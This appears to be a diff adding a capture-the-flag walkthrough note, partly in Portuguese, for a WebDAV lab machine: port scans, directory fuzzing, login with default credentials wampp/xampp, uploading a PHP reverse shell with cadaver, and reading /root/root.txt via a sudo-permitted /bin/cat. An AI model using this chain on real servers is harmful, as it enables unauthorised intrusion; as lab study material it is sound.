@@ -1,0 +1,53 @@
+--> sudo rustscan -a 10.64.186.187
+
+open: 10.64.186.187:80
+
+
+--> sudo nmap -sV -sC -p80 
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+
+--> ffuf -u http://10.64.186.187/FUZZ -H "Host: 10.64.186.187" -w ~/Downloads/Wordlists/admin.txt -i -ic -c -mc 200,301,401
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.64.186.187/FUZZ
+ :: Wordlist         : FUZZ: /home/nanoxsec/Downloads/Wordlists/admin.txt
+ :: Header           : Host: 10.64.186.187
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,301,401
+________________________________________________
+
+webdav                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 156ms]
+
+--> http://10.64.186.187/webdav --> Basic Auth
+	|_> USERNAME: wampp
+	|_> PASSWORD: xampp
+	
+--> http://10.64.186.187/webdav/passwd.dav --> credênciais
+
+--> cadaver http://10.64.186.187:80/webdav --> logando com as credênciais
+--> dav:/webdav/shell/> put /home/nanoxsec/Tools/Shells/rshell.php8
+	|_> fiz upload da reverse shell pro servidor
+	
+Escalando privilégio:
+
+--> sudo -l:
+    User www-data may run the following commands on ubuntu:
+    	(ALL) NOPASSWD: /bin/cat
+--> sudo /bin/cat /root/root.txt
